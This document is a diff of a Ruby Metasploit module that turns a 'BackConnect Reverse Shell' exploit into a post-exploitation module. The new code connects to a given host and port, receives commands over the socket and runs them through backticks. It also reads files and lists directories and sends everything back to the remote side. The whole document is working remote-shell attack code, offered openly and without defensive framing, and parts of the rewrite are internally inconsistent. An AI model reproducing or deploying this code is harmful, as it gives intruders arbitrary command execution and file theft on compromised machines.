@@ -1,115 +1,122 @@
 require 'msf/core'
 
-class BackConnect < Msf::Exploit::Remote
-  include Msf::Exploit::Remote::TcpServer
+class MetasploitModule < Msf::Post
+  include Msf::Post::Unix
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'BackConnect Reverse Shell',
-      'Description'    => 'BackConnect using Metasploit Reverse Shell',
-      'License'        => MSF_LICENSE,
-      'Author'         => ['indoushka'],
-      'Platform'       => ['linux', 'unix'],
-      'Payload'        => 'linux/x86/shell/reverse_tcp',
-      'Rank'           => 'Excellent'
+    super(merge_info(info,
+      'Name'        => 'PHP Back Connect Reverse Shell',
+      'Description' => %q{
+        This module connects back to a given PHP server and executes commands on the target system.
+      },
+      'License'     => MSF_LICENSE,
+      'Author'      => ['Your Name'],
+      'Platform'    => ['unix'],
+      'Arch'        => [ARCH_X86],
+      'Privileged'  => false,
+      'Targets'     => [['PHP Back Connect', {}]],
+      'DefaultTarget' => 0
     ))
 
     register_options(
       [
-        OptString.new('RHOST', [true, 'The target IP address']),
-        OptInt.new('RPORT', [true, 'The target port', 4444]),
-      ], self.class)
+        OptString.new('RHOST', [true, 'Target PHP server IP', '192.168.1.100']),
+        OptInt.new('RPORT', [true, 'Target PHP server port', 4444])
+      ]
+    )
   end
 
-  def exploit
-    connect_to_target
-  end
-
-  def connect_to_target
+  def run
+    server = datastore['RHOST']
+    port = datastore['RPORT']
+    
+    print_status("Connecting to PHP back connect server at #{server}:#{port}...")
+    
     begin
-      print_status("محاولة الاتصال بـ #{@rhost} على المنفذ #{@rport}...")
-      socket = connect
+      socket = connect_to_target(server, port)
+      print_good("Connected successfully.")
 
-      # البيانات الأساسية التي ستتم طباعتها عند الاتصال بنجاح
-      client_ip = Socket.ip_address_list.detect(&:ipv4_private?).ip_address
-      server_ip = `hostname -I`.strip
-      kernel_version = get_kernel_version
-      current_time = Time.now.strftime("%Y-%m-%d %H:%M:%S")
+      while true
+        # Receive command from the attacker
+        command = socket.gets.strip
 
-      socket.puts "Connected to target!"
-      socket.puts "Client IP: #{client_ip}"
-      socket.puts "Server IP: #{server_ip}"
-      socket.puts "Kernel Version: #{kernel_version}"
-      socket.puts "Current Time: #{current_time}"
-
-      handle_commands(socket)
-
-    rescue ::Exception => e
-      print_error("Connection failed: #{e.message}")
-    end
-  end
-
-  def handle_commands(socket)
-    while true
-      command = socket.gets.strip
-      break if command.nil? || command == "by"
-
-      case command
-      when /cd\s+(.+)/
-        change_directory($1, socket)
-      when "hi"
-        socket.puts "Current Directory: #{Dir.pwd}"
-      when "uname -r", "you"
-        socket.puts `uname -r`
-      when "so", "ok"
-        socket.puts list_directory_contents(Dir.pwd)
-      when "info"
-        socket.puts system_info
-      when /^nano\s+(.+)/
-        read_file($1, socket)
-      else
-        socket.puts execute_command(command)
+        case command
+        when 'by'
+          break
+        when /^cd (.+)$/
+          change_directory($1)
+        when 'hi' # Show current directory
+          socket.puts(current_directory)
+        when 'uname -r'
+          socket.puts(get_kernel_version)
+        when 'so', 'ok'
+          socket.puts(list_directory_contents)
+        when 'info'
+          socket.puts(system_info)
+        when 'all', 'winrani', 'moi'
+          socket.puts(list_directory_details)
+        when /^nano (.+)$/
+          read_file($1, socket)
+        else
+          output = execute_command(command)
+          socket.puts(output)
+        end
       end
-    end
-  end
 
-  def change_directory(dir, socket)
-    begin
-      new_dir = File.realpath(dir)
-      if Dir.exist?(new_dir)
-        Dir.chdir(new_dir)
-        socket.puts "Current Directory: #{new_dir}"
-      else
-        socket.puts "Directory not found: #{dir}"
-      end
+      socket.close
     rescue => e
-      socket.puts "Error changing directory: #{e.message}"
+      print_error("Failed to connect or run commands: #{e.message}")
     end
   end
 
-  def list_directory_contents(dir)
-    Dir.exist?(dir) ? Dir.entries(dir).join("\n") : "Cannot access directory!"
+  def connect_to_target(server, port)
+    # Create a TCP socket to the PHP server
+    socket = Rex::Socket.create_tcp(
+      'PeerHost' => server,
+      'PeerPort' => port
+    )
+    socket
+  end
+
+  def current_directory
+    `pwd`.strip
+  end
+
+  def get_kernel_version
+    if `uname -r`.strip.empty?
+      'Unknown Kernel Version'
+    else
+      `uname -r`.strip
+    end
+  end
+
+  def list_directory_contents
+    `ls`.strip
   end
 
   def system_info
-    RUBY_PLATFORM.include?("mswin") ? `ver`.strip : `uname -a`.strip
+    if RUBY_PLATFORM.include?("win32")
+      `ver`.strip
+    else
+      `uname -r`.strip
+    end
   end
 
-  def read_file(filename, socket)
-    if File.exist?(filename)
-      content = File.read(filename)
-      socket.puts "File Content:\n#{content}"
+  def list_directory_details
+    `ls -la`.strip
+  end
+
+  def read_file(file, socket)
+    if File.exist?(file)
+      content = File.read(file)
+      socket.puts("File Content:\n#{content}")
     else
-      socket.puts "File not found: #{filename}"
+      socket.puts("File not found: #{file}")
     end
   end
 
   def execute_command(command)
-    output = `#{command} 2>&1`
-    output.empty? ? "Command execution blocked!" : output
-  end
-
-  def get_kernel_version
-    RUBY_PLATFORM.include?("mswin") ? "Windows Version Unknown" : `uname -r`.strip
+    result = `#{command} 2>&1`
+    result.empty? ? "Command execution failed" : result
   end
 end
